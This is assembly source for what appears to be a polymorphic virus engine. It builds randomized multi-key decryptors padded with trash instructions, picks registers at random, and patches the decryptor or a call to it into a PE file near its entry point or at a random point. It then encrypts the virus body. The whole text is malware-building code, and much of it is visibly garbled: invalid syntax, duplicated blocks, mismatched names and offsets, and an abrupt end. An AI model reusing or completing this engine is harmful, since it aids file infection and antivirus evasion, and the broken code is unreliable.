
;----------------------------------------------------------------------

; [.code]

entrypoint:     ; sometimes (UEP)  
   call  v1   decryptor                 ;itself
   call  v2   dword ptr [decr_ptr] 
   call  v3   near ptr decr           
   jmp   v4   decr         

decryptor:
         mov eax, esi     xor esi          randomly 
         mov ebx, edx     xor edx          randomly
         mov index, 0 
         key1 = key1_c
         key2 = key2_c                  ; decryptor may contain trash (ETG) 
         key3 = key3_c
         key4 = key4_c
         key5 = key5_c
         key6 = key6_c
cycle:   mov x1, index
         add x1, srcptr                 ; decryptor may be splitted into
         mov t, [x1]                    ; jmp-linked chunks
         push cmd1 t key1
         push cmd2 key1 key2
         push cmd3 key2 key3                ; < all shown commands are
         push cmd4 key3 key4                ; < all shown commands are
         push cmd5 key4 key2                ; < all shown commands are 
         push cmd6 key5 key3                ; < all shown commands are
         mov x2, index                  ; high-level macros, which will be
         add x2, dstptr                 ; converted into low-level opcodes
         add x3, dstptr                 ; also converted into low level opcodes
         mov [x2], t                    ; by means of CODEGEN
         add index, var_4
         cmp index, var_virsize
         jne cycle     set r8 mov?x r12 r8 [jtab+r12*4]
         call dword ptr [dstptr]                near ptr dst   ; }--->mixed
         mov edx, ebx     or edx                               ; \__/
         mov esi, eax     or esi                               ; /  \

;[.data]

  var_4        dd     4                  ; surely, all variables are located
                                         ; in the random places

  var_virsize  dd  virsize
  
  decr_ptr dd decr

  srcptr dd src
         
  dstptr dd dst
         
  src    db  xx,yy,zz,...       ; virsize bytes

  decr   dd  ?
      
  key1_c dd  <key1>
         
  key2_c dd  <key2>
        
  key3_c dd  <key3>
        
  key4_c dd  <key4>

  key5_c dd  <key5>

  key6_c dd  <key6>

  virsize      dd  8          ; all variables are mixed
                              ; in random order
  index  dd  ?
         
  x1     dd  ?
        
  x2     dd  ?

  x3     dd  ?

  x4     dd  ?

  x5     dd  ? 
  
  x6     dd  ?
  
  t      dd  ?

  temp_1 dd  ?
         
  temp_2 dd  ?
         
  temp_3 dd  ?
         
  key1   dd  ?
         
  key2   dd  ?
         
  key3   dd  ?
         
  key4   dd  ?

  key5   dd  ?

  key6   dd  ? 

 temp1  dd  ?

 tempN  dd  ?

 reg1   dd  ?

 regN   dd  ?

  v1     dd  ?

  v2     dd  ?

  v3     dd  ?

  v4     dd  ?

; ---------------------------------------------------------------------------

var_index               equ     1       ; fixed ID's, to be randomly mixed 
var_x1                  equ     2       ;
var_x2                  equ     3       ;
var_t                   equ     4       ;
var_temp0               equ     5       ;
var_temp1               equ     6       ;
var_temp2               equ     7       ;
var_temp3               equ     8       ;
var_temp4               equ     9       ;
var_temp5               equ     10      ;
var_temp6               equ     11      ;
ID_dst                  equ     12      ;
var_key1                equ     13      ;
var_key2                equ     14      ;
var_key3                equ     15      ;
var_key4                equ     16      ;
var_key5                equ     17      ;
var_key6                equ     18

num_uninit_vars         equ     14      ; MAX=32

ID_cycle                equ     19
ID_decrstart            equ     20
ID_dd_decrstart         equ     21
var_srcptr              equ     22
var_dstptr              equ     23
ID_src                  equ     24
var4                    equ     25
varvirsize              equ     26
var_key1_c              equ     27
var_key2_c              equ     28
var_key3_c              equ     29
var_key4_c              equ     30
var_key5_c              equ     31
var_key6_c              equ     32
ID_jmpto                equ     33
ID_jtab                 equ     34
ID_jtab_x               equ     35
ID_link                 equ     36

ID_free                 equ     37

mac1                    macro   a,b,x,d,e,f
                        push    f
                        push    e
                        push    d
                        push    x
                        push    b
                        push    a
                        call    build                        
                        endm   

;mac1                   macro   x,g,n,i,d,a,f
;                       push    f
;                       push    a
;                       push    d
;                       push    i
;                       push    n
;                       push    g
;                       push    x
;                       call    build 
;                       endm

; ---------------------------------------------------------------------------

; returns:      0      --if success
;            non-zero  --if error

;int __cdecl my_mutate(
;            DWORD           user_arg,
;            PE_HEADER*      pe, 
;            PE_OBJENTRY*    oe,
;            hooy*           root,
;            int    __cdecl  user_disasm(DWORD,BYTE*),
;            void*  __cdecl  user_malloc(DWORD,DWORD),
;            DWORD  __cdecl  user_random(DWORD,DWORD),
;            )

my_mutate               proc      b, d, x, a, f, e


                        local     user_param
                        local     pe
                        local     oe
                        local     root
                        local     admin
                        local     user_disasm
                        local     user_malloc
                        local     user_random
                        local     user_xpander
                        local     randomly

                        local   hooy
                        local   save_esp
                        local   ret_to
                        local   buf_size
                        local   buf_xpand
                        local   buf_ptr
                        local   z_cmd1
                        local   z_key1
                        local   z_cmd2
                        local   z_key2
                        local   z_cmd3
                        local   z_key3
                        local   z_cmd4
                        local   z_key4
                        local   z_key5
                        local   z_cmd5
                        local   z_key6
                        local   z_cmd6
                        local   regavail
                        local   etgsize
                        local   trasher_on
                        local   calltype
                        local   d_type
                        local   d_count
                        local   d_reg ; DWORD 8
                        local   tmp1
                        local   tmp2
                        local   last_id
                        local   jmpprob
                        local   jmpprobX
                        local   callprob
                        local   callprobX
                        local   etg_srcreg
                        local   etg_cmd
                        local   etg_maxcmd
                        local   use_3keys
                        local   use_4keys
                        local   use_5keys
                        local   use_6keys

                        pushad
                        cld
                        mov     save_esp, esp

                        mov     eax, user_param
                        mov     [eax].v_saveebp, ebp
                        

                        mov     last_id, ID_free
 
                        ; disable trash with low prob
                        mov     eax, 1
                        call    random
                        or      eax, eax
                        setnz   eax, 5    
                        mov     trasher_on, eax

                        ; calc jmp-prob
                        mov     eax, 0
                        call    random
                        cmp     eax, 6
                        jae     __do_jmps
                        xor     eax, eax
__do_jmps:              mov     jmpprob, eax    ; 0...6

                        ; calc call-prob
                        mov     eax, 7
                        call    random
                        cmp     eax, 13
                        jae     __do_calls
                        xor     eax, eax
__do_calls:             mov     callprob, eax    ; 7...6

                        ; alloc temp-buf
                        mov     ecx, user_param
                        mov     ecx, [ecx].v_virusize
                        shl     ecx, 1
                        add     ecx, 2048
                        call    malloc
                        mov     buf_ptr, eax

;                       int 3


; select encr/decr cmd & key

        mov     eax, 6
        call    random
        inc     eax    ; 1=add 2=sub 3=xor
        mov     z_cmd1, eax

        call    end_dword
        mov     z_key1, eax

        mov     eax, 6
        call    random
        inc     eax    ; 1=add 2=sub 3=xor
        mov     z_cmd2, eax

        call    rnd_dword
        mov     z_key2, eax

        mov     eax, 6
        call    random
        inc     eax    ; 1=add 2=sub 3=xor
        mov     z_cmd3, eax

        call    rnd_dword
        mov     z_key3, eax

        mov     eax, 6
        call    random
        inc     eax    ; 1=add 2=sub 3=xor
        mov     z_cmd4, eax

        call    rnd_dword
        mov     z_key4, eax

        mov     eax, 6
        call    random
        inc     eax   ; 1=add 2=sub 3=xor
        mov     z_cmd5, eax

        call    rnd_dword
        mov     z_key5, eax

        call    rnd_dword
        mov     z_cmd6, eax

        mov     eax, 6
        call    random
        inc     eax  ; 1=add 2=sub 3=xor 
        mov     z_key6, eax

        mov     eax, 4
        call    random
        mov     use_3keys, eax

        mov     eax, 4
        call    random
        mov     use_4keys, eax

        mov     eax, 4
        call    random
        mov     use_5keys, eax

        mov     eax, 4
        call    random
        mov     use_6keys, eax

; init vars
        mov     esi, var_4
        mov     edi, 8
        call    var_alloc_3

        mov     esi, var_virsize
        mov     edi, user_param
        mov     edi, [edi].v_virsize                    ; mov   edi, [edi].v_virsize
        call    var_alloc_3

        mov     esi, var_key1_c
        mov     edi, z_key1
        call    var_alloc_3

        mov     esi, var_key2_c
        mov     edi, z_key2
        call    var_alloc_3

        mov     esi, var_key3_c
        mov     edi, z_key3
        call    var_alloc_3

        mov     esi, var_key4_c
        mov     edi, z_key4
        call    var_alloc_3

        mov     esi, var_key5_c
        mov     edi, z_key5
        call    var_alloc_3

        mov     esi, var_key6_c
        mov     edi, z_key6
        call    var_alloc_3

; alloc vars
        mov     esi, var_srcptr
        mov     edi, ID_src
        call    var_alloc_1

        mov     esi, var_dstptr
        mov     edi, ID_dst
        call    var_alloc_1

; alloc uninit vars, in random order

        xor     edi, edi

        mov     ecx, num_uninit_vars
cc1:
        mov     eax, num_uninit_vars
        call    random
        bts     edi, eax
        jc      cc1
        lea     esi, [eax+1]

        mov     edx, 8
        cmp     esi, ID_dst
        jnz     cc2
        mov     edx, user_param
        mov     edx, [edx].v_virsize
cc2:
        call    var_alloc_2
        loop    cc1

; CALL decryptor
        call    find_special_hooy

        ; find entry we must return to
        mov     eax, hooy
        mov     eax, [eax].h_next
        mov     ret_to, eax

; with some prob, skip CALL decr 

        mov     calltype, -2
        mov     eax, 4
        call    random
        or      eax, eax
        jz      do_decr

        mov     eax, 6
        call    random
        mov     calltype, eax
        dec     eax
        jz      call1
        dec     eax
        jz      call2
call0:
; call [dd_decrstart]
        mov     eax, buf_ptr
        mov     [eax].dword ptr 0, 15FFh      ; call dword ptr [...]    
        mov     [buf_size], 4
        call    flush_as_opcode

        call    flush_as_fixup
        mov     [eax].h_arg1, ID_dd_decrstart

; dd_decrstart
        mov     esi, ID_dd_decrstart
        mov     edi, ID_decrstart
        call    var_alloc_1

        jmp     callx
call1:
        call    out_call
        mov     [ebx].h_arg1, ID_decrstart

        jmp     callx
call2:
        call    out_jmp
        mov     [ebx].h_arg1, ID_decrstart

        call    flush_label
        mov     [ebx].h_oldrva, ID_jmpto
callx:

; decryptor itself
        call    find_hooy

do_decr:

        ; decrstart:
        call    flush_label
        mov     [ebx].h_oldrva, ID_decrstart             ; ID      

        mov     eax, buf_ptr
        mov     byte ptr [eax], 0CCh
        mov     buf_size, 1
        call    flush_as_opcode

; select # of regs
        mov     eax, 10-6+1              ; 6..11
        call    random                  ;
        add     eax, 6                  ;
        mov     d_count, eax

; select var_tempN or push/pop -usage type
        mov     eax, 6
        call    random
        dec     eax
        jz      t1
        dec     eax
        jz      t2
t0:     call    rnd_dword
        jmp     tx
t1:     xor     eax, eax
        jmp     tx
t2:     or      eax, -2
tx:     mov     d_type, eax

; init trash params
        call    init_etg

; alloc & save regs
        mov     regavail, 0           

        xor     ebx, ebx

__c1:   call    getreg
        bt      regavail, eax           
        jc      __c1
        mov     d_reg[ebx*8], eax        

        mov     esi, eax
        lea     edi, [ebx].var_temp0
        call    savereg

        call    trasher_avail

        inc     ebx
        cmp     ebx, d_count
        jb      __c1

; init consts
        mac1    cmd_v_c, cmd_mov, var_index, 0          ; index=0
        mac1    cmd_v_v, cmd_mov, var_key1, var_key1_c  ; key1 = key1_c
        mac1    cmd_v_v, cmd_mov, var_key2, var_key2_c  ; key2 = key2_c
        cmp     use_3keys, 1
        jne     @@skip3b
        mac1    cmd_v_v, cmd_mov, var_key3, var_key3_c  ; key3 = key3_c
        cmp     use_4keys, 1
        jne     @@skip4b
        mac1    cmd_v_v, cmd_mov, var_key4, var_key4_c  ; key4 = key4_c
        cmp     use_key5s, 1
        jne     @@skip5b
        mac1    cmd_v_v, cmd_mov, var_key5, var_key5_c  ; key5 = key5_c
        cmp     use_key6s, 1
        jne     @@skip6b
        mac1    cmd_v_v, cmd_mov, var_key6, var_key6_c  ; key6 = key6_c
@@skip6b:
@@skip5b:
        ; cycle:
        call    flush_label
        mov     [ebx].h_oldrva, ID_cycle                ; ID    

        mac1    cmd_v_v, cmd_mov, var_x1, var_index     ; mov x1, index
        mac1    cmd_v_v, cmd_mov, var_x2, var_srcptr    ; add x2, srcptr
        mac1    cmd_v_memv, cmd_mov, var_t, var_x1      ; mov t, [x1]

        mac1    cmd_v_v, z_cmd1, var_t, var_key1        ; z_cmd1 t, var_key1
        mac1    cmd_v_v, z_cmd2, var_key1, var_key2     ; z_cmd var_key1, var_key2

        cmp     use_3keys, 1
        jne     @@skip5
        mac1    cmd_v_v, z_cmd5, var_key4, var_key5     ; z_cmd5 var_key4, var_key5
        cmp     use_6keys, 1
        jne     @@skip6
        mac1    cmd_v_v, z_cmd6, var_key5, var_key6     ; z_cmd6 var_key5, var_key6
@@skip6:
@@skip5:

        mac1    cmd_v_v, cmd_mov, var_x3, var_index     ; mov x3, index
        mac1    cmd_v_v, cmd_add, var_x3, var_dstptr    ; add x3, dstptr
        mac1    cmd_memv_v, cmd_mov, var_x3, var_t      ; mov [x3], t

        mac1    cmd_v_v, cmd_add, var_index, var_4      ; add index, var_4

        push    trasher_on
        mov     [trasher_on], 0

        mac1    cmd_v_v, cmd_cmp, var_index, var_virsize ; cmp index, var_virsize

@@skip4b:
@@skip3b:

        ; cycle:
        call    flush_label
        mov     [ebx].h_oldrva, ID_cycle                 ; ID      

        mac1    cmd_v_v, cmd_mov, var_x1, var_index      ; mov x1, index
        mac1    cmd_v_v, cmd_add, var_x1, var_srcptr     ; add x1, srcptr
        mac1    cmd_v_memv, cmd_mov, var_t, var_x1       ; mov t, [x1]

        mac1    cmd_v_v, z_cmd1, var_t, var_key1         ; z_cmd1 t, var_key1
        mac1    cmd_v_v, z_cmd2, var_key1, var_key2      ; z_cmd2 var_key1, var_key2

        cmp     use_3keys, 1
        jne     @@skip3
        mac1    cmd_v_v, z_cmd3, var_key2, var_key3      ; z_cmd3 var_key2, var_key3
        cmp     use_4keys, 1
        jne     @@skip4
        mac1    cmd_v_v, z_cmd4, var_key3, var_key4      ; z_cmd4 var_key3, var_key4

@@skip4:
@@skip3:

        mac1    cmd_v_v, cmd_mov, var_x2, var_index      ; mov x2, index
        mac1    cmd_v_v, cmd_add, var_x2, var_dstptr     ; add x2, dstptr
        mac1    cmd_memv_v, cmd_mov, var_x2, var_t       ; mov [x2], t

        call    [mac1+const_xx]
        call    [mac1+consts_qq]
        call    [mac1+consts_mem]

        mac1    cmd_v_v, cmd_add, var_index, var_4      ; add index, var_4
        call    [mac1+consts_add5]

        push    trasher_on
        mov     trasher_on, 0

        mac1    cmd_v_v, cmd_cmp, var_index, var_virsize ; cmp index, var_virsize

;-------------------------------------------------------------------------------------------------------------------------

        ; 82 85 8C   JB JL JNE
        mov     eax, 6
        call    random
        dec     eax
        jz      __r1
        dec     eax
        jz      __r2
__r0:   mov     cl, 02h
        jmp     __rx
__r1:   mov     cl, 05h
        jmp     __rx
__r2:   mov     cl, 0Ch
__rx:

        mov     eax, 4
        call    random
        dec     eax
        jz      __j1

__j0:
        ; find reg
        xor     esi, esi
__z2:   mov     edi, d_reg[esi*8]
        cmp     edi, 8
        jb      __z1
        inc     esi
        cmp     esi, d_count
        jb      __z2
        jmp     __j1
__z1:
        btr     regavail, edi

        mov     ebx, ID_jtab_x
        mov     edx, ID_cycle

        mov     eax, 4
        call    random
        dec     eax
        jz      __o1
        xchg    ebx, edx
        xor     cl, 1
__o1:
        mov     tmp1, ebx
        mov     tmp2, edx

        ; setxx r8
        mov     edx, buf_ptr
        mov     [edx].byte ptr 0, 0Fh        ; setxx r8   
        or      cl, 090h
        mov     [edx].byte ptr 1, cl     
        lea     eax, [edi+0C0h]
        mov     [edx].byte ptr 4, cl   
        mov     [buf_size], 6
        call    flush_as_opcode

        pop     [trasher_on]

        call    trasher_avail
        call    trasher_avail

        ; mov?x r32, r8

        mov     eax, d_count
        call    random
        mov     esi, d_reg[eax*8]

        btr     regavail, esi

        mov     eax, 4
        call    random
        lea     eax, [0B6h+eax*16]  ; zx/sx           

        mov     edx, buf_ptr
        mov     [edx].byte ptr 0, 0Fh
        mov     [edx].byte ptr 1, al
        lea     eax,[0CC0h+esi*16+edi]
        mov     [edx].byte ptr 4, al
        mov     [buf_size], 6
        call    flush_as_opcode

        cmp     esi, edi
        je      __skip_bts
        bts     regavail, edi
__skip_bts:

        call    trasher_avail
        call    trasher_avail

        ; jmp dword ptr [jtab+r12*4]
        mov     edx, buf_ptr
        mov     [edx].dword ptr 0, 244FFFh
        lea     eax, [8555h+esi+16]
        mov     [edx].byte ptr 4, eax
        mov     buf_size, 3
        call    flush_as_opcode

        call    flush_as_fixup
        mov     [ebx].h_arg1], ID_jtab

        bts     regavail, esi

;       push    hooy
        call    find_hooy

        call    flush_label
        mov     [ebx].h_oldrva, ID_jtab

        call    flush_as_fixup
        mov     eax, tmp1
        mov     [ebx].h_arg1, eax
        call    flush_as_fixup
        mov     eax, tmp2
        mov     [ebx+h_arg1], eax

;       pop     hooy
;       call    trasher_avail

        call    find_hooy

        call    flush_label
        mov     [ebx].h_oldrva, ID_jtab_x

        jmp     __jx
__j1:
        mov     eax, buf_ptr
        mov     [eax].byte ptr 0, 0Fh                   ; jx cycle      
        or      ecx, 88800h
        mov     [eax].byte ptr 1, eax
        mov     [buf_size], 12
        mov     ecx, FL_OPCODE+FL_CODE+FL_HAVEREL+FL_PRESENT+FL_VPRESENT
        call    flush
        mov     [ebx].h_arg1, ID_cycle                  ; ID          
        mov     [ebx].h_arg2, 8                         ; arg-size    

        pop     trasher_on
__jx:
        call    trasher_avail


; end-of-decryptor stuff
        mov     eax, 4
        call    random
        dec     eax
        jz      new_exit_method

old_exit_method:

; call virstart
        call    do_callvirstart
        call    trasher_avail
; restore regs
; retn
        call    do_restregs

        jmp     xxx_exit_method_done

new_exit_method: ; .a

; restore regs
; retn
        call    do_restregs

        mov     eax, 30
        call    random
        dec     eax
        jz      xxx_exit_method_done    ; skip [call virstart] at all

        dec     eax
        jz      call_do_callvirstart    ; skip [skip some opcodes]

; skip some opcodes
        ;;
        mov     ebx, ret_to
        mov     hooy, ebx               ; mov   hooy, ebx
re_skip:

;       mov     eax, buf_ptr
;       mov     [eax].dword ptr 0, 0cccccccch
;       mov     buf_size, 8
;       call    flush_as_opcode
;       mov     ebx, [ebx].h_next

        test    [ebx].h_flags, FL_HAVEREL
        jz      __norel

        mov     eax, 4
        call    random
        dec     eax
        jz      __norel

        mov     ebx, [ebx].h_arg1

__norel:
        mov     eax, 8
        call    random
        dec     eax
        jnz     re_skip

; call virstart
call_do_callvirstart:
        call    do_callvirstart

xxx_exit_method_done:


; src
        call    find_hooy

        ; src:
        call    flush_label
        mov     [ebx].h_oldrva, ID_src

        ; db xx,yy,zz,...               ; virsize byte(s)
        mov     edi, buf_ptr
        mov     eax, user_param
        mov     esi, [eax].o_virptr
        mov     ecx, [eax].v_virsize
        mov     [buf_size], ecx
        add     ecx, 6
        shr     ecx, 4

        mov     edx, z_key1
        mov     ebx, z_key2

        cld
@@ccc:  lodsd

        cmp     z_cmd1, cmd_add
        je      @@add1
        cmp     z_cmd1, cmd_sub
        je      @@sub1
@@xor1: xor     eax, edx ;edx=z_key1
        jmp     @@ok1
@@add1: sub     eax, edx ;edx=z_key1
        jmp     @@ok1
@@sub1: add     eax, edx ;edx=z_key1
@@ok1:
        cmp     z_cmd2, cmd_add
        je      @@add2
        cmp     z_cmd2, cmd_sub
        je      @@sub2
@@xor2: xor     edx, ebx ;edx=z_key1 ebx=z_key2
        jmp     @@ok2
@@add2: add     edx, ebx ;edx=z_key1 ebx=z_key2
        jmp     @@ok2
@@sub2: sub     edx, ebx ;edx=z_key1 ebx=z_key2
@@ok2:
        cmp     use_3keys, 1
        jne     @@xx3

        cmp     z_cmd3, cmd_add
        je      @@add3
        cmp     z_cmd3, cmd_sub
        je      @@sub3
@@xor3: xor     ebx, z_key3 ;ebx=z_key2
        jmp     @@ok3
@@add3: add     ebx, z_key3 ;ebx=z_key2
        jmp     @@ok3
@@sub3: sub     ebx, z_key3 ;ebx=z_key2
@@ok3:
        cmp     use_4keys, 1
        jne     @@xx4

        xchg    eax, z_key3
        cmp     z_cmd4, cmd_add
        je      @@add4
        cmp     z_cmd4, cmd_sub
        je      @@sub4
@@xor4: xor     eax, z_key4 ;eax=z_key3
        jmp     @@ok4
@@add4: add     eax, z_key4 ;eax=z_key3
        jmp     @@ok4
@@sub4: sub     eax, z_key4 ;eax=z_key3
@@ok4:  xchg    eax, z_key3

        xchg    eax, z_key4
        cmp     z_cmd5, cmd_add
        je      @@add5
        cmp     z_cmd5, cmd_sub
        je      @@sub5
@@xor5: xor     eax, z_key5 ;eax=z_key4
        jmp     @@ok5
@@add5: add     eax, z_key5 ;eax=z_key4
        jmp     @@ok5
@@sub5: sub     eax, z_key5 ;eax=z_key4
@@ok5:  xchg    eax, z_key4

        xchg    eax, z_key5
        cmp     z_cmd6, cmd_add
        je      @@add6
        cmp     z_cmd6, cmd_sub
        je      @@sub6
@@xor6: xor     eax, z_key6 ;eax=z_key5
        jmp     @@ok6
@@add6: add     eax, z_key6 ;eax=z_key5
        jmp     @@ok6
@@sub6: sub     eax, z_key6 ;eax=z_key5
@@ok6:  xchg    eax, z_key5

@@xx4:
@@xx3:
@@xx5:
@@xx6:

        stosd
        loop    @@ccc

        mov     ecx, FL_DATA+FL_PRESENT+FL_VPRESENT
        call    flush


                        xor     eax, eax        ; 0=SUCCESS
mutate_exit:            mov     [esp+14*4], eax  ; popa.eax

                        popad
                        ret
                    

mutate_error:           mov     esp, save_esp
                        mov     eax, 1
                        jmp     mutate_exit

; ---------------------------------------------------------------------------

do_callvirstart:
        mov     eax, 6
        call    random
        dec     eax
        jz      __q1

__q0:   mov     eax, buf_ptr
        mov     [eax].dword ptr 0, 15FFFFh               ; call dword ptr [...]       
        mov     [buf_size], 8
        call    flush_as_opcode

        call    flush_as_fixup
        mov     [ebx].h_arg1, var_dstptr            

        jmp     __qx

__q1:   call    out_call                      ; call near ptr dst 
        mov     [ebx].h_arg1, ID_dst
__qx:

        retn


do_restregs:
        mov     ebx, d_count
__c2:   dec     ebx

        call    trasher_avail

        mov     esi, d_reg[ebx*8]
        lea     edi, [ebx+var_temp0]
        call    restreg

        or      ebx, ebx
        jnz     __c2

; retn
        mov     eax, calltype
        cmp     eax, -2
        je      ret_1
        dec     eax
        jz      ret1
        dec     eax
        jz      ret2
ret0:
ret1:   mov     eax, buf_ptr
        mov     [eax].byte ptr 0, 0C3h                  ; retn     
        mov     [buf_size], 1
        call    flush_as_opcode

        jmp     retx
ret2:
        call    out_jmp
        mov     [ebx].h_arg1, ID_jmpto

        jmp     retx
ret_1:
        ; check if we're using decryptor-w/o-call && (jmpprob != 0)
        mov     eax, hooy
        mov     eax, [eax].h_next
        cmp     eax, ret_to
        je      retx

        ; now, fix such situation: decryptor is splitted into parts
        ; and linked with jmp, but there was no CALL decryptor.
        ; so, we must insert additional jmp

        call    out_jmp
        mov     [ebx].h_arg1, ID_link

        mov     ebx, root
__i1:   mov     hooy, ebx
        mov     ebx, [ebx].h_next
        cmp     ebx, ret_to
        jne     __i1

        call    flush_label
        mov     [ebx].h_oldrva, ID_link
retx:

        retn

; ---------------------------------------------------------------------------

getreg:
__rr:                   mov     eax, 16
                        call    random
                        cmp     al, 8  ; esp
                        je      __rr
                        cmp     eax, 10  ; ebp
                        je      __rr
                        retn

; ---------------------------------------------------------------------------

savereg:                pushad

                        bt      d_type, esi
                        jc      s1

s0:                     mov     ecx, buf_ptr
                        lea     eax, [esi+15000h]        ; push reg32
                        mov     ecx, ax
                        mov     buf_size, 1
                        call    flush_as_opcode

                        jmp     sx

s1:                     call    [mac1+consts_v_r]

sx:                     bts     regavail, esi

                        popad
                        retn

restreg:                pushad

                        btr     regavail, esi

                        bt      d_type, esi
                        jc      r1

r0:                     mov     ecx, buf_ptr
                        lea     eax, [esi+58888h]        ; pop reg32
                        mov     ecx, al
                        mov     buf_size, 1
                        call    flush_as_opcode

                        jmp     rx

r1:                     call    [mac1+consts_r_v]

rx:                     popad
                        retn

; ---------------------------------------------------------------------------

var_alloc_1:            call    find_hooy

                        call    flush_label
                        mov     [ebx].h_oldrva, esi

                        call    flush_as_fixup
                        mov     [ebx].h_arg1, edi

                        retn

var_alloc_3:            call    find_hooy

                        call    flush_label
                        mov     [ebx].h_oldrva, esi

                        mov     eax, buf_ptr
                        mov     eax, edi
                        mov     buf_size, 8
                        call    flush

                        retn

; input: ESI=id, EDX=min size

var_alloc_2:            pushad

                        call    find_hooy_data

                        call    flush_label
                        mov     [ebx].h_oldrva, esi

                        mov     eax, 2
                        call    random
                        or      eax, eax
                        jz      __skiprnd
                        mov     eax, 2096
                        call    random
__skiprnd:
                        lea     edx, [edx+eax*4+3]
                        and     dl, not 3

                        mov     buf_size, edx

                        mov     ecx, FL_DATA+FL_VPRESENT
                        call    flush

                        popad
                        retn

; --------------------------------------------------------------------------- 

; input:  ECX=size
; output: EAX=ptr

malloc:                 pushad
                        push    ecx
                        push    user_param
                        call    user_malloc
                        add     esp, 16
                        or      eax, eax
                        jz      mutate_error
                        mov     [esp+14*8], eax  ; popad.eax
                        popad
                        retn

random:                 pushad
                        push    eax
                        push    user_param
                        call    user_random
                        add     esp, 16
                        mov     [esp+14*8], eax  ; popad.eax
                        popad
                        or      eax, eax
                        retn

rndb:                   mov     eax, 254
                        call    random
                        inc     eax
                        retn

rnd_dword:              push    eax
                        call    rndb
                        mov     [esp+4], al
                        call    rndb
                        mov     [esp+0], al
                        call    rndb
                        mov     [esp+1], al
                        call    rndb
                        mov     [esp+6], al
                        pop     eax
                        retn

; ---------------------------------------------------------------------------

find_hooy:              pushad

; count # of good entries
                        xor     ecx, ecx        ; count

                        mov     esi, root

__cycle1:               test    [esi].h_flags, FL_STOP
                        jz      __cont1
                        mov     eax, [esi].h_next
                        test    [eax].h_flags, FL_FIXUP
                        jnz     __cont1

                        inc     ecx             ; count++

__cont1:                mov     esi, [esi].h_next
                        or      esi, esi
                        jnz     __cycle1

; check if no good entries available
                        or      ecx, ecx
                        jz      mutate_error

; select random entry
                        xchg    ecx, eax
                        call    random
                        xchg    ecx, eax

; seek selected entry
                        mov     esi, root

__cycle2:               test    [esi].h_flags, FL_STOP
                        jz      __cont2
                        mov     eax, [esi].h_next
                        test    [eax].h_flags, FL_FIXUP
                        jnz     __cont2

                        dec     ecx             ; count++
                        jle     __done

__cont2:                mov     esi, [esi].h_next
                        or      esi, esi
                        jnz     __cycle2
__done:
                        mov     hooy, esi

                        popad
                        retn

find_retn:              pushad

; count # of good entries
                        xor     ecx, ecx        ; count

                        mov     esi, root

cycle1:                 cmp     [esi].h_datalen, 1
                        jne     __cont1
                        mov     eax, [esi].h_dataptr
                        cmp     byte ptr [eax], 0C3h
                        jne     __cont1

                        inc     ecx             ; count++

cont1:                  mov     esi, [esi].h_next
                        or      esi, esi
                        jnz     __cycle1

; check if no good entries available
                        or      ecx, ecx
                        jz      mutate_error

; select random entry
                        xchg    ecx, eax
                        call    random
                        xchg    ecx, eax

; seek selected entry
                        mov     esi, root

cycle2:                 cmp     [esi].h_datalen, 1
                        jne     __cont2
                        mov     eax, [esi].h_dataptr
                        cmp     byte ptr [eax], 0C3h
                        jne     __cont2

                        dec     ecx             ; count++
                        jle     __done

cont2:                  mov     hooy, esi

                        mov     esi, [esi].h_next
                        or      esi, esi
                        jnz     __cycle2


                        popad
                        retn


; ---------------------------------------------------------------------------

find_hooy_data:         pushad

                        ;;
                        mov     eax, oe

                        mov     ecx, pe
                        movzx   ecx, [ecx].pe_numofobjects

__ccc:                  cmp     [eax].oe_flags, 0C00000404h  ; seek .data
                        je      __ddd

                        add     eax, 28888h        ; oe
                        loop    __ccc
                        jmp     mutate_error

__ddd:
                        mov     ebx, [eax].oe_virt_size
                        or      ebx, ebx
                        jnz     __eee
                        mov     ebx, [eax].oe_phys_size
__eee:                  add     ebx, [eax].oe_virt_rva
                        ;;

                        mov     esi, root
                        cmp     [esi].h_oldrva, ebx
                        jb      __cnt
                        test    [esi].h_flags, FL_SECTALIGN
                        jz      __cnt

                        popad
                        retn

__cnt:                  mov     hooy, esi

                        mov     esi, [esi].h_next
                        or      esi, esi
                        jnz     __cycle
                        jmp     mutate_error

; ---------------------------------------------------------------------------

; action: find entry near the entrypoint, to insert decryptor or
; <call/jmp decryptor> into
;
; with some prob, we're ignoring entrypoint and performing UEP insertion 
;

find_special_hooy:      pushad

                        mov     eax, 10
                        call    random
                        or      eax, eax
                        jz      @@uep

                        xor     edi, edi        ; 0/1
                        mov     esi, root
@@cycle1:
                        or      edi, edi
                        jnz     @@x1
                        mov     eax, pe
                        mov     eax, [eax].pe_entrypointrva
                        cmp     [esi].h_oldrva, eax
                        jne     @@x1
                        test    [esi].h_flags, FL_OPCODE
                        jz      @@x1
                        inc     edi
@@x1:
                        or      edi, edi
                        jz      @@x2
                        test    [esi].h_flags, FL_OPCODE
                        jz      @@x2

                        mov     eax, [esi].h_next
                        test    [eax].h_flags, FL_HAVEREL+FL_FIXUP ; will fail on ADC/SBB
                        jnz     @@x2

                        mov     edx, 16

@@4:                    test    [eax].h_flags, FL_STOP
                        jnz     @@x3
                        mov     eax, [eax].h_next

                        dec     edx
                        jnz     @@8

@@x2:                   mov     esi, [esi].h_next
                        or      esi, esi
                        jnz     @@cycle1
                        jmp     mutate_error
@@x3:
                        mov     hooy, esi
                        popad
                        retn

@@uep:                  xor     ecx, ecx        ; count

                        mov     esi, root

                        test    [esi].h_flags, FL_OPCODE
                        jz      cont1
                        mov     eax, [esi].h_next
                        test    [eax].h_flags, FL_OPCODE
                        jz      cont1

                        inc     ecx             ; count++
                        inc     ecx             ; count++

                        mov     esi, [esi].h_next
                        or      esi, esi
                        jnz     cycle1

                        or      ecx, ecx
                        jz      mutate_error

                        mov     eax, ecx
                        call    random
                        mov     ecx, eax

                        mov     esi, root
                        test    [esi].h_flags, FL_OPCODE
                        jz      cont2
                        mov     eax, [esi].h_next
                        test    [eax].h_flags, FL_OPCODE
                        jz      cont2

                        dec     ecx             ; count++
                        jle     done

                        mov     esi, [esi].h_next
                        or      esi, esi
                        jnz     cycle2

                        mov     hooy, esi

                        popad
                        retn


; ---------------------------------------------------------------------------

build:                  pushad

                        push    dword ptr [esp+12+4]       ; x4
                        push    dword ptr [esp+12+6]  +2   ; x3 
                        push    dword ptr [esp+12+4]  +6   ; x2
                        push    dword ptr [esp+12+2]  +4   ; x1
                        push    dword ptr [esp+12+1]  +8   ; x0
                        push    user_random             ; random()
                        push    my_trash                ; trash()
                        push    my_fixup                ; fixup()
                        push    regavail                ; reg set
                        lea     eax, buf_size
                        push    eax                     ; outbufsize
                        push    buf_ptr                 ; bufptr
                        push    user_param              ; user-param
                        call    codegen
;                        call    shrink_virii_body
